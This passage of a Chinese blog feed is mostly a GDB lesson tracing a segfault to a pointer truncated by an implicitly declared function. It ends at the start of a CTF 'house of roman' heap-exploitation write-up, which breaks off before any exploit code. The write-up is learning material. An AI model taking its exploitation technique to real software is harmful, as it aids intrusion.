class=&#34;type&#34;&gt;char&lt;/span&gt; * &lt;span class=&#34;title function_&#34;&gt;get_name&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* full_path)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; * sep = &lt;span class=&#34;built_in&#34;&gt;strrchr&lt;/span&gt;(full_path, &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (sep == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)? &lt;span class=&#34;string&#34;&gt;&amp;quot;errname&amp;quot;&lt;/span&gt;: sep+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ptrtrap.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* name = get_name(argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Demo of pointer trap by Raymond.\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name: %s\n&amp;quot;&lt;/span&gt;, name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	在编译的时候会给出一个警告&lt;/p&gt;
&lt;p&gt;gcc -g ptrtrap.c parser.c&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-4-8-ubuntu:/home/ubuntu/youlan# gcc -g ptrtrap.c parser.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptrtrap.c: In function ‘main’:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptrtrap.c:5:22: warning: implicit declaration of function ‘get_name’; did you mean ‘rename’? [-Wimplicit-function-declaration]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    5 |         char* name = get_name(argv[0]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      |                      ^~~~~~~~&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      |                      rename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptrtrap.c:5:22: warning: initialization of ‘char *’ from ‘int’ makes pointer from integer without a cast [-Wint-conversion]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	运行的时候会发生段错误&lt;/p&gt;
&lt;p&gt;Program received signal SIGSEGV, Segmentation fault&lt;/p&gt;
&lt;p&gt;段错误，访问了不该访问的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024145754493.png&#34; alt=&#34;image-20231024145754493&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;调试分析&#34;&gt;&lt;a href=&#34;#调试分析&#34; class=&#34;headerlink&#34; title=&#34;调试分析&#34;&gt;&lt;/a&gt;调试分析&lt;/h1&gt;&lt;h2 id=&#34;回溯粗看&#34;&gt;&lt;a href=&#34;#回溯粗看&#34; class=&#34;headerlink&#34; title=&#34;回溯粗看&#34;&gt;&lt;/a&gt;回溯粗看&lt;/h2&gt;&lt;p&gt;​	朱熹的不远复:“不远复”，出自《易经》“不远之复，以修身也”。和孔子的吾日三省吾身有异曲同工之妙,人要不断反思自己,反省走的路.&lt;/p&gt;
&lt;p&gt;​	bt命令回溯 调用栈 , &lt;strong&gt;库函数一般都经过很多修改和测试、一般没问题，所以更多的还是自己写的代码的问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024150010518.png&#34; alt=&#34;image-20231024150010518&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	可以减少bt的显示，如 bt -frame-info short-location 不带源代码位置&lt;/p&gt;
&lt;p&gt;​	frame 3查看自己写的函数里的栈帧的情况, list查看源代码， 这样就能够看到上下文， disass查看汇编&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024150656532.png&#34; alt=&#34;image-20231024150656532&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	所以能够看到问题是在 call  printf这里，产生了问题, &lt;strong&gt;也就是传入的name有问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	问: __printf为什么带下划线？&lt;/p&gt;
&lt;p&gt;​	答: 因为__printf是libc实现的，   _ _通常是编译器的函数 编译器的优化？&lt;/p&gt;
&lt;p&gt;​	info shared查看进程里的库, ld负责把程序从外存搬运到内存, libc负责实现标准库函数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; info shared&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;From                To                  Syms Read   Shared Object Library&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x00007ffff7fc5090  0x00007ffff7fee315  Yes         /lib64/ld-linux-x86-64.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x00007ffff7daf700  0x00007ffff7f41b3d  Yes         /lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h4 id=&#34;函数从哪里开始执行？&#34;&gt;&lt;a href=&#34;#函数从哪里开始执行？&#34; class=&#34;headerlink&#34; title=&#34;函数从哪里开始执行？&#34;&gt;&lt;/a&gt;函数从哪里开始执行？&lt;/h4&gt;&lt;p&gt;​	elf从哪里开始呢，不是main 是_start(), bt有个选项 -past-main查看main函数之前的,有的默认开启了&lt;/p&gt;
&lt;p&gt;__libc_start_call_main 用来做准备工作？&lt;/p&gt;
&lt;h2 id=&#34;细看崩溃指令&#34;&gt;&lt;a href=&#34;#细看崩溃指令&#34; class=&#34;headerlink&#34; title=&#34;细看崩溃指令&#34;&gt;&lt;/a&gt;细看崩溃指令&lt;/h2&gt;&lt;p&gt;​	来到崩溃的那一行汇编来看看什么情况,这里指向的含义是 尝试执行这条指令，但是失败了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024151819672.png&#34; alt=&#34;image-20231024151819672&#34;&gt;&lt;/p&gt;
&lt;p&gt;vpcmpeqb指令&lt;/p&gt;
&lt;p&gt;​	[rdi]是引用内存, 此时的rdi的值是0xffffffffffffe7db,我们来看一下内存的情况,用info inferiors命令,查看进程,然后从proc里看内存(pwndbg可以直接vmmap)&lt;/p&gt;
&lt;p&gt;​	从这里看地址就能看出来，是无效地址, 用户空间的大小早超了(所以说每个细节都需要关注)&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;info inferiors&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Num  Description       Connection           Executable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 1    process 1269337   1 (native)           /home/ubuntu/youlan/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; /proc/1269337/maps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;555555554000-555555555000 r--p 00000000 fc:02 822041                     /home/ubuntu/youlan/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;555555555000-555555556000 r-xp 00001000 fc:02 822041                     /home/ubuntu/youlan/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;555555556000-555555557000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;555555557000-555555558000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;555555558000-555555559000 rw-p 00003000 fc:02 822041                     /home/ubuntu/youlan/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7d84000-7ffff7d87000 rw-p 00000000 00:00 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7d87000-7ffff7daf000 r--p 00000000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7daf000-7ffff7f44000 r-xp 00028000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7f44000-7ffff7f9c000 r--p 001bd000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7f9c000-7ffff7fa0000 r--p 00214000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fa0000-7ffff7fa2000 rw-p 00218000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fa2000-7ffff7faf000 rw-p 00000000 00:00 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fc3000-7ffff7fc5000 r--p 00000000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fc5000-7ffff7fef000 r-xp 00002000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7fef000-7ffff7ffa000 r--p 0002c000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7ffb000-7ffff7ffd000 r--p 00037000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffff7ffd000-7ffff7fff000 rw-p 00039000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;何人传来无效指针&#34;&gt;&lt;a href=&#34;#何人传来无效指针&#34; class=&#34;headerlink&#34; title=&#34;何人传来无效指针?&#34;&gt;&lt;/a&gt;何人传来无效指针?&lt;/h2&gt;&lt;p&gt;​	库函数出问题概率很低，所以找自己写的函数.  我们知道问题出在name变量上&lt;/p&gt;
&lt;p&gt;​	frame 3 、然后用 p name 、info locals 都能看到是无效的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-16-56.jpg&#34; alt=&#34;Snipaste_2023-10-26_17-16-56&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	info frame 看函数的栈帧信息&lt;/p&gt;
&lt;p&gt;​	既然是name错了 它哪里来的？ &lt;strong&gt;get_name&lt;/strong&gt;，&lt;/p&gt;
&lt;h3 id=&#34;get-name调试&#34;&gt;&lt;a href=&#34;#get-name调试&#34; class=&#34;headerlink&#34; title=&#34;get_name调试&#34;&gt;&lt;/a&gt;get_name调试&lt;/h3&gt;&lt;p&gt;​	设置get_name的断点进行调试&lt;/p&gt;
&lt;p&gt;​	返回值看rax（通常通用寄存器第一个存返回值），&lt;strong&gt;rax在返回的时候是没问题的，那哪里出问题了。。此时事情就很奇怪了&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&#34;/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-38-09.jpg&#34; alt=&#34;Snipaste_2023-10-26_17-38-09&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;返回后执行ni, 单步一下,再看值,就错了&lt;/p&gt;
&lt;img src=&#34;/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-35-28.jpg&#34; alt=&#34;Snipaste_2023-10-26_17-35-28&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;h2 id=&#34;答案揭晓&#34;&gt;&lt;a href=&#34;#答案揭晓&#34; class=&#34;headerlink&#34; title=&#34;答案揭晓&#34;&gt;&lt;/a&gt;答案揭晓&lt;/h2&gt;&lt;p&gt;​	问题就出在这一条指令上,它改变了值的大小&lt;/p&gt;
&lt;p&gt;​	cdqe: 扩展指令,使用eax的最高位拓展rax高32位的所有位&lt;/p&gt;
&lt;p&gt;​	x86下和arm不太一样, sxtw这条指令有问题（arm下&lt;/p&gt;
&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;这是编译器故意产生的指令,和没有include这个函数有关系&lt;/font&gt;,再深入的..就先放放&lt;/p&gt;
&lt;h1 id=&#34;问题与知识补充&#34;&gt;&lt;a href=&#34;#问题与知识补充&#34; class=&#34;headerlink&#34; title=&#34;问题与知识补充&#34;&gt;&lt;/a&gt;问题与知识补充&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;include进来就没问题了&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt; #include “parser.c”&lt;/p&gt;
&lt;p&gt;但是有个新的warning&lt;/p&gt;
&lt;p&gt;32位下编译没问题&lt;/p&gt;
&lt;p&gt;为什么会有一个nop指令&lt;/p&gt;
&lt;p&gt;nop插桩&lt;/p&gt;
&lt;h3 id=&#34;如何跑arm系统&#34;&gt;&lt;a href=&#34;#如何跑arm系统&#34; class=&#34;headerlink&#34; title=&#34;如何跑arm系统&#34;&gt;&lt;/a&gt;如何跑arm系统&lt;/h3&gt;&lt;p&gt;macbook直接可以&lt;/p&gt;
&lt;p&gt;x86怎么装？：看样子基本上离不开qemu&lt;/p&gt;
&lt;p&gt;云服务器买&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/chenxiangneu/article/details/78955462&#34;&gt;https://blog.csdn.net/chenxiangneu/article/details/78955462&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;设置符号服务器？&lt;/p&gt;
&lt;h3 id=&#34;失败了如何再执行？&#34;&gt;&lt;a href=&#34;#失败了如何再执行？&#34; class=&#34;headerlink&#34; title=&#34;失败了如何再执行？&#34;&gt;&lt;/a&gt;失败了如何再执行？&lt;/h3&gt;&lt;p&gt;info signal&lt;/p&gt;
&lt;p&gt;info handle&lt;/p&gt;
&lt;p&gt;handle SIGSEGV nopass （不给应用程序&lt;/p&gt;
&lt;p&gt;再跑一遍又会收到这个信号&lt;/p&gt;
&lt;p&gt;smd指令。。。&lt;/p&gt;
&lt;p&gt;用户空间 内核空间大小&lt;/p&gt;
</content>
        <category term="调试" />
        <updated>2023-10-26T13:54:31.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-44-houseofroman/</id>
        <title>pwn入门-44-houseofroman</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-44-houseofroman/"/>
        <content type="html">&lt;p&gt;​	在一次比赛中遇到了堆题,没有show函数,懵逼了…当时有略过一丝思路通过io stdout输出,但奈何这方面知识了解还不多(不过确实可以通过搜索引擎 搜索关键字来找到这种手法)&lt;/p&gt;
&lt;p&gt;​	(后来发现这是n年前的手法了😭, &lt;/p&gt;
&lt;h1 id=&#34;例题&#34;&gt;&lt;a href=&#34;#例题&#34; class=&#34;headerlink&#34; title=&#34;例题&#34;&gt;&lt;/a&gt;例题&lt;/h1&gt;&lt;p&gt;npuctf_2020_bad_guy&lt;/p&gt;
&lt;h2 id=&#34;题目分析&#34;&gt;&lt;a href=&#34;#题目分析&#34; class=&#34;headerlink&#34; title=&#34;题目分析&#34;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;经典菜单堆,但是没有show&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span 